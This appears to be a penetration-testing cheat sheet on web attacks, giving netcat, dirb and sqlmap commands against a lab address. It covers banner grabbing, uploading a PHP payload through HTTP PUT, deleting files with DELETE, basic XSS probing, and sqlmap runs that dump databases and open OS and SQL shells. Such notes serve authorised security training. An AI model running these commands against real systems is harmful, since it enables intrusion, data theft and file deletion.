---
description: Web application vulns and exploits
---

# Web Attacks

## Banner grabbing

### Netcat (for HTTP services) <a href="#netcat-for-http-services" id="netcat-for-http-services"></a>

```
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
```

### OpenSSL (for HTTPS services) <a href="#openssl-for-https-services" id="openssl-for-https-services"></a>

```
openssl s_client -connect 10.10.10.10:443
HEAD / HTTP/1.0
```

### Httprint <a href="#httprint" id="httprint"></a>

```
httprint -P0 -h 10.10.10.10 -s /usr/share/httprint/signatures.txt
```

## HTTP Verbs <a href="#http-verbs" id="http-verbs"></a>

`GET, POST, HEAD, PUT, DELETE`

### PUT is used to upload a file to the server <a href="#put-is-used-to-upload-a-file-to-the-server" id="put-is-used-to-upload-a-file-to-the-server"></a>

You have to find the size of the file you are uploading first

```
wc -m payload.php
[size] payload.php
```

```
nc 10.10.10.10 80
PUT /payload.php
Content-type: text/html
Content-length: [size]

```

### DELETE is used to delete a file from the server <a href="#delete-is-used-to-delete-a-file-from-the-server" id="delete-is-used-to-delete-a-file-from-the-server"></a>

```
nc 10.10.10.10 80
DELETE /path/to/file.txt / HTTP/1.0
```

### OPTIONS is used to query the webserver for enabled HTTP Verbs <a href="#options-is-used-to-query-the-webserver-for-enabled-http-verbs" id="options-is-used-to-query-the-webserver-for-enabled-http-verbs"></a>

```
nc 10.10.10.10 80
OPTIONS / HTTP/1.0
```

## Directory and File scanning <a href="#directory-and-file-scanning" id="directory-and-file-scanning"></a>

### Dirbuster <a href="#dirbuster" id="dirbuster"></a>

![Dirbuster](https://gblobscdn.gitbook.com/assets%2F-M\_9npUfU\_wpKvUX\_GaB%2F-MagR4YPOWTFD\_15vHvL%2F-MahfUhT53l7HHnpBBge%2Fdirbuster.png?alt=media\&token=61b8043d-946f-4850-884f-0fb38c3ae4d7)

### dirb <a href="#dirb" id="dirb"></a>

```
dirb http://10.10.10.10/
```

**If Webpage is authenticated**

```
dirb http://10.10.10.10/ -u <username>:<password>
```

1. You can choose different wordlists for the dictionary brute force but from my experience in most labs you can find them in the `common.txt`
2. You can also choose different extensions but _`php`_ and _`bak`_ will be the most useful ones to find.
3. If there is HTTP authentication or login of some other kind for the webpage you can set the creds using \[Options -> Advanced Options -> Authentication options]
4. The con with Dirbuster is that it sometimes freezes which is a real bummer otherwise it's real good.

## Google Dorks <a href="#google-dorks" id="google-dorks"></a>

`site:` \
`intitle:` \
`inurl:` \
`filetype:` \
`AND, OR & |` \
`-`

​[GHDB](https://www.exploit-db.com/google-hacking-database) for more resources.

## XSS (Cross-Site Scripting) <a href="#xss-cross-site-scripting" id="xss-cross-site-scripting"></a>

1. Find a reflection point
2. Test with HTML tag (\<h1>Test\</h1>)
3. Test with JS code \[alert('XSS')]

XSS filter bypass cheatsheet: [OWASP cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)​

**Reflected XSS**: Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload.

**Persistent XSS**: Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post.

## SQL Injections <a href="#sql-injections" id="sql-injections"></a>

### GET <a href="#get" id="get"></a>

```
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id
```

```
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U
```

### Database USER <a href="#database-user" id="database-user"></a>

```
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --user
```

### Databases <a href="#databases" id="databases"></a>

```
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dbs
```

### Dump all <a href="#dump-all" id="dump-all"></a>

```
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dump
```

### POST <a href="#post" id="post"></a>

Find the parameters that are being passed in POST using BurpSuite. \
E.g: **`username=some&password=thing`** where the parameter username is vulnerable.

```
sqlmap -u 'http://10.10.10.10/login.php' --data='username=some&password=thing' -p username --technique=B
```

**The Databases, Users and dump-all switches are the same as for the GET parameter.**

If you aren't able to deduce which parameter is vulnerable in POST, you can drop the -p switch. SQLMAP will try to test them and find them on its own so don't sweat it and also for most of the prompts use the default options(i.e. just press enter).

The --technique switch is to create less noise and prevent the service from shutting down due to query overload. If the given techniques do not work try it removing the switch.

### OS-Shell <a href="#os-shell" id="os-shell"></a>

```
sqlmap -u "http://10.10.10.10/login.php" --os-shell
```

### SQL-Shell <a href="#sql-shell" id="sql-shell"></a>

```
sqlmap -u "http://10.10.10.10/login.php" --sql-shell
```
